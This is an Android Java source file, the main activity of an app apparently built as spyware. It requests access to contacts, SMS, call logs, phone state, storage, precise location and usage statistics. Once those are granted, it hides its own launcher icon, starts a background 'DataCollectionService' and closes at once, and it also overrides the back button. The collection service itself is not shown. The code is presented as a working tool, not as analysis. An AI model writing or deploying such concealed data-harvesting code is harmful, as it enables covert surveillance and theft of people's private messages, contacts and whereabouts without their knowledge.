package com.dataPackageSandeep.com;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String PREFS_NAME = "DataCollectorPrefs";
    private static final String PERMISSIONS_GRANTED_KEY = "permissions_granted";
    
    private TextView statusText;
    private Button startButton;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        
        // Check if permissions already granted - auto-start and hide
        if (prefs.getBoolean(PERMISSIONS_GRANTED_KEY, false)) {
            hideAppIcon();
            startDataCollection();
            finish();
            return;
        }
        
        // Auto-start: Check permissions and start service immediately
        if (checkAndRequestPermissions()) {
            // All permissions already granted - start immediately
            hideAppIcon();
            startDataCollection();
            finish();
            return;
        }
        
        // Some permissions missing - show UI briefly to request them
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.statusText);
        startButton = findViewById(R.id.startButton);
        
        startButton.setOnClickListener(v -> {
            if (checkAndRequestPermissions()) {
                hideAppIcon();
                startDataCollection();
            }
        });
        
        // Auto-request permissions
        checkAndRequestPermissions();
    }
    
    private boolean checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        };
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
            return false;
        }
        
        // Request usage stats permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!isUsageStatsPermissionGranted()) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivity(intent);
                Toast.makeText(this, "Please enable Usage Access", Toast.LENGTH_LONG).show();
            }
        }
        
        return true;
    }
    
    private boolean isUsageStatsPermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.app.usage.UsageStatsManager usageStatsManager = 
                (android.app.usage.UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usageStatsManager.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000 * 10, time);
            return !stats.isEmpty();
        }
        return true;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                // All permissions granted - hide icon and start service
                hideAppIcon();
                startDataCollection();
            } else {
                if (statusText != null) {
                    statusText.setText("Please grant all permissions");
                }
            }
        }
    }
    
    private void startDataCollection() {
        if (statusText != null) {
            statusText.setText("Starting data collection...");
        }
        
        Intent serviceIntent = new Intent(this, DataCollectionService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Mark permissions as granted
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(PERMISSIONS_GRANTED_KEY, true).apply();
        
        // Hide icon immediately
        hideAppIcon();
        
        // Close activity immediately - no delay
        finish();
    }
    
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onBackPressed() {
        // Prevent going back - just minimize
        moveTaskToBack(true);
    }
}
